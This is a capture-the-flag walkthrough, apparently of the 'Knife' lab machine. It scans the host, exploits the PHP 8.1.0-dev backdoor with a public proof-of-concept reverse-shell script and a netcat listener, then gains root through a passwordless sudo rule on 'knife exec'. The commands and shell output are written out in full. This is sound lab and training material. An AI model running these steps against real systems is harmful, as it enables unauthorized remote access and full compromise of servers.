## Default Information
IP address : 10.10.10.242\
Operating system : Linux

## Discovery
### Nmap
Lets start with running a network scan on the IP address using Nmap to identify the open ports and the services running on the open ports (NOTE: This might take up quite some time)
* sV : service detection
* sC : Run default nmap scripts
* A : identify the OS behind each ports
* -p- : scan all ports
```code 
sudo nmap -sC -sV -A -p- -T4 10.10.10.242 -vv
```
From the output of Nmap, we are able to know the following informtion about the ports:
| Port Number | Service | Version |
|-----|------------------|----------------------|
| 22	| SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) |
| 80	| HTTP | Apache httpd 2.4.41 (Ubuntu) |

### Nikto
Visting the website does not yield any promising results as there are only 2 urls that can be found --> ```http://10.10.10.242``` and ```http://10.10.10.242/robots.txt```\
Next, we will scan the website with ```Nikto``` to uncover potential vulnerabilities in the website and the web server used. The following interesting information were uncovered:
```code
+ Server: Apache/2.4.41 (Ubuntu)
+ Retrieved x-powered-by header: PHP/8.1.0-dev
```

## Exploit
### CVE-2020-1927
CVE 2020-1927 was found to be related to ```Apache/2.4.41```, but it was found not to be exploitable on the website.\
However, we were able to find a POC [here](https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py) for ```PHP/8.1.0-dev```
```code
git clone https://github.com/flast101/php-8.1.0-dev-backdoor-rce.git
mv backdoor_php_8.1.0-dev.py exploit_rce.py 
mv revshell_php_8.1.0-dev.py exploit_revshell.py 
```

### Obtaining reverse shell
Now, we have to set up a listener on the attacker's machine
```code
nc -nlvp 3000
```
Afterwards, we will execute the exploit script on the victim's macchine to obtain a reverse shell on the attacker's machine
```code
python3 exploit_revshell.py http://10.10.10.242 10.10.16.250 3000 
```
We will now have to stabilize the shell and obtain the user flag.
```code
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3000
listening on [any] 3000 ...
connect to [10.10.16.250] from (UNKNOWN) [10.10.10.242] 48826
bash: cannot set terminal process group (1036): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
james@knife:/$ 
```

### Obtaining user flag

Now, all we have to do is to navigate to ```/home/james``` to obtain the user flag.
```
james@knife:/$ cd home
cd home
james@knife:/home$ ls
ls
james
james@knife:/home$ cd james
cd james
james@knife:~$ ls
ls
user.txt
james@knife:~$ cat user.txt
cat user.txt
```

### Spawning a root shell
However, we have not discovered the root flag yet! However, we noticed something interesting when we run ```sudo -l```. The command ```/usr/bin/kniife``` allows any user to execute with root privileges, without the need for any password.
```code
james@knife:~$ sudo -l
sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```
Searching up the documentation for ```knife```, we realise that there is a [knife exec](https://docs.chef.io/workstation/knife_exec/) command that allows us to execute scripts using ```knife```, which can allow us to obtain a root shell
```code
sudo /usr/bin/knife exec --exec "exec '/bin/sh -i'"
```
We will then stabilize the root shell and obtain the system flag.
```code
james@knife:~$ sudo /usr/bin/knife exec --exec "exec '/bin/sh -i'"
sudo /usr/bin/knife exec --exec "exec '/bin/sh -i'"
# python3 -c 'import pty; pty.spawn("/bin/bash")'   
python3 -c 'import pty; pty.spawn("/bin/bash")'
root@knife:/home/james#
```

### Obtaining a root flag

All that we have to do is to navigate to ```/root``` to obtain the root flag.
```
root@knife:/home/james# cd /root
cd /root
root@knife:~# ls
ls
delete.sh  root.txt  snap
root@knife:~# cat root.txt
cat root.txt
```
